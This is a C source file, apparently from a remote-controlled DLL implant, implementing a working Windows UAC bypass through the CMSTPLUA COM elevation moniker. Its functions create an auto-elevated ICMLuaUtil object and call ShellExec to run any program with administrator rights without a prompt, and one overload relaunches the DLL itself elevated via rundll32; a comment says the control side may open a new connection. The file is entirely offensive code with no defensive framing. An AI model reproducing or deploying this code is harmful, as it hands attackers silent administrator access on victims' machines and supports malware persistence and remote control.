#include "pch.h"

#include "uac_bypass.h"
#include "dllmain.h"
#include "runtime/utils.h"

static HRESULT CoCreateInstanceAsAdmin(HWND hWnd, REFCLSID rclsid, REFIID riid, PVOID* ppVoid)
{
	BIND_OPTS3 bo;
	WCHAR wszCLSID[MAX_PATH] = { 0 };
	WCHAR wszMonikerName[MAX_PATH] = { 0 };
	HRESULT hr = 0;

	// 初始化COM环境
	CoInitialize(NULL);

	// 构造字符串
	StringFromGUID2(rclsid, wszCLSID, (sizeof(wszCLSID) / sizeof(wszCLSID[0])));
	hr = StringCchPrintfW(wszMonikerName, (sizeof(wszMonikerName) /
		sizeof(wszMonikerName[0])), L"Elevation:Administrator!new:%s", wszCLSID);
	if (FAILED(hr))
	{
		return hr;
	}
	// 设置BIND_OPTS3
	RtlZeroMemory(&bo, sizeof(bo));
	bo.cbStruct = sizeof(bo);
	bo.hwnd = hWnd;
	bo.dwClassContext = CLSCTX_LOCAL_SERVER;
	// 创建名称对象并获取COM对象
	hr = CoGetObject(wszMonikerName, &bo, riid, ppVoid);
	return hr;
}

BOOL BypassUAC(LPCWSTR lpwszExecutable, LPCWSTR parameter)
{
	HRESULT hr = 0;
	CLSID clsidICMLuaUtil = { 0 };
	IID iidICMLuaUtil = { 0 };
	ICMLuaUtil* CMLuaUtil = NULL;
	BOOL bRet = FALSE;
	do {
		CLSIDFromString(CLSID_CMSTPLUA, &clsidICMLuaUtil);
		IIDFromString(IID_ICMLuaUtil, &iidICMLuaUtil);

		hr = CoCreateInstanceAsAdmin(NULL, clsidICMLuaUtil, iidICMLuaUtil, (PVOID*)(&CMLuaUtil));
		if (FAILED(hr))
		{
			break;
		}

		hr = CMLuaUtil->lpVtbl->ShellExec(CMLuaUtil, lpwszExecutable, parameter, NULL, 0, SW_SHOW);
		if (FAILED(hr))
		{
			break;
		}
		bRet = TRUE;
	} while (FALSE);

	if (CMLuaUtil)
	{
		CMLuaUtil->lpVtbl->Release(CMLuaUtil);
	}
	return bRet;
}

// 通过提权的方法再调用一份提升权限后的本dll, 控制段可能会建立新的连接.
BOOL BypassUAC(LPCWSTR self_cmd)
{
	wchar_t* p = lstrcat_heap(module_path, L",EntryPoint ");
	LPWSTR parameter = lstrcat_heap(p, self_cmd);
	//BypassUAC((LPWSTR)L"C:\\Users\\warren\\Desktop\\del.exe", NULL);
	//BypassUAC((LPWSTR)L"C:\\Windows\\System32\\cmd.exe", NULL);
	return BypassUAC(L"C:\\Windows\\System32\\rundll32.exe", parameter);
}

